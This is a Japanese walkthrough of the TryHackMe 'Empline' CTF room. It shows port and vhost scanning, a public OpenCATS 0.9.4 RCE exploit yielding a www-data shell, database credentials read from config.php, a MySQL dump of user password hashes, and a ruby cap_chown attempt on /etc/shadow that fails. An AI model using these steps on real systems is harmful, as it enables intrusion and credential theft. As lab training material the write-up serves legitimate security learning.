# Empline CTF

https://tryhackme.com/room/empline

## Enumeration

```shell
TARGET=10.201.121.33
sudo bash -c "echo $TARGET   empline.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

```sh
sudo nmap -sS -sV -p22,80,3306 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
```

SSH, HTTP, MySQL

### ディレクトリ列挙

```sh
dirb http://empline.thm/

---- Scanning URL: http://empline.thm/ ----
==> DIRECTORY: http://empline.thm/assets/                                                                            
+ http://empline.thm/index.html (CODE:200|SIZE:14058)                                                                
==> DIRECTORY: http://empline.thm/javascript/                                                                        
+ http://empline.thm/server-status (CODE:403|SIZE:276)
```

assets, javascript ディレクトリが見つかっただけ。

### サブドメイン、VHOST

job, www.job を発見。

```shell
root@ip-10-201-102-209:~# ffuf -u http://empline.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.empline.thm' -fs 14058

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://empline.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.empline.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 14058
________________________________________________

job                     [Status: 200, Size: 3671, Words: 209, Lines: 102]
www.job                 [Status: 200, Size: 3671, Words: 209, Lines: 102]
:: Progress: [114532/114532] :: Job [1/1] :: 2086 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

## job.empline.thm

`opencats` のログイン画面。`Version 0.9.4 Countach`

このバージョンにRCEがある。

```sh
$ searchsploit opencats     
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenCATS 0.9.4 - Remote Code Execution (RCE)                                                                                                                                                            | php/webapps/50585.sh
OpenCats 0.9.4-2 - 'docx ' XML External Entity Injection (XXE)                                                                                                                                          | php/webapps/50316.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

シェル取得成功。

```sh
$ ./50585.sh http://job.empline.thm/  
 _._     _,-'""`-._ 
(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
    `-.-' \ )-`( , o o)         Nicholas  Ferreira
          `-    \`_`"'-   https://github.com/Nickguitar-e 

[*] Attacking target http://job.empline.thm/
[*] Checking CATS version...
-e [*] Version detected: 0.9.4
[*] Creating temp file with payload...
[*] Checking active jobs...
./50585.sh: 105: [[: not found
-e [+] Jobs found! Using job id 1
[*] Sending payload...
-e [+] Payload r1JU3.php uploaded!
[*] Deleting created temp file...                                                                                                                                                                                                         
[*] Checking shell...                                                                                                                                                                                                                     
-e [+] Got shell! :D                                                                                                                                                                                                                      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux ip-10-201-121-33 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
-e 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 列挙（shell）

```sh
$ ls -al /home
total 20
drwxr-xr-x  5 root     root     4096 Jul  5 14:48 .
drwxr-xr-x 24 root     root     4096 Oct 29 00:21 ..
drwxrwx---  2 george   george   4096 Jul 20  2021 george
drwxr-xr-x  2 ssm-user ssm-user 4096 Jul  5 14:48 ssm-user
drwxr-xr-x  3 ubuntu   ubuntu   4096 Jul  5 14:59 ubuntu
```

config.php。この認証情報を使って opencats にログインできたが、特に有用なデータは無かった。

```php
$ cat /var/www/opencats/config.php

/* License key. */
define('LICENSE_KEY','3163GQ-54ISGW-14E4SHD-ES9ICL-X02DTG-GYRSQ6');

/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', '[REDACTED]');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

mysql

```sh
MariaDB [opencats]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | [REDACTED] |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
```

crackstation で george のパスワードが判明。昇格成功。

```sh
www-data@ip-10-201-121-33:/home$ su george
Password: 
george@ip-10-201-121-33:/home$ id
uid=1002(george) gid=1002(george) groups=1002(george)
```

## 権限昇格

ruby に cap_chown が付いている。

```sh
george@ip-10-201-121-33:~$ getcap -r / 2>/dev/null
...
/usr/local/bin/ruby = cap_chown+ep
```

shadowのchownを試みるが、エラー発生。

```sh
george@ip-10-201-121-33:~$ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
ruby: error while loading shared libraries: libruby-2.5.so.2.5: cannot open shared object file: No such file or directory
```

ファイルが存在しない。

```sh
george@ip-10-201-121-33:~$ find /usr -name 'libruby-2.5.so.2.5' 2>/dev/null
```

この問題はDiscordでルームバグとして報告されていたが、いつものように無視されている。

```
Carthica
スレ主
 — 2025/08/06 22:10
who should I contact ? this room is broken, since we get that a necessary library for ruby is missing (thus ruby can't be used which is necessary for the root flag) https://tryhackme.com/room/empline
I tried adding the library but things kept breaking down, I suspect maybe an update happened or smthng and the challenge got broken as such cuz it relies on an older version, I saw the writeups online, and the ruby should work as it did in the past.

Dave T — 2025/08/15 21:32
It looks from the write-ups that this room was originally running on Ubuntu 18.04 whereas now I think the room launches with Ubuntu 20.04 which may explain the discrepancy. The supporting library for Ruby 2.5 is missing.
So libruby-2.5.so.2.5
```

あとは /etc/passwd を書き込み可能にして root ユーザーを追加するだけだしどうせ修正もされないだろうから、ここで終わりにする。

## 振り返り

- mysql コマンドで -p オプションをつけ忘れていてかなりの時間を無駄にした。
- cap_chown は勉強になった。
